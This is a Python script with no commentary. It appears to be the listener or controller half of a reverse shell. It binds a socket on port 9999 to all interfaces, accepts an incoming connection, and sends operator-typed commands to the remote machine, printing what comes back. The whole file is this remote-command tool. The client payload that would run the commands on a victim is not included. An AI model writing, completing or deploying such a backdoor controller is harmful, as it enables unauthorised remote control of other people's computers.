import socket
import sys

#create socket (allow to connect to this server)

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))

#Bind socket to port and wait for connection

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port " + str(port))
        s.bind((host, port))
        s.listen(5) #no of bad connection before refucing the connection
    except socket.error as msg:
        print("socket binding errot: " + str(msg) + "\n" + "Retrying.....")
        socket_bind()

#accept the connection

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established |" + " IP " +  address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
             conn.close()
             s.close()
             sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()





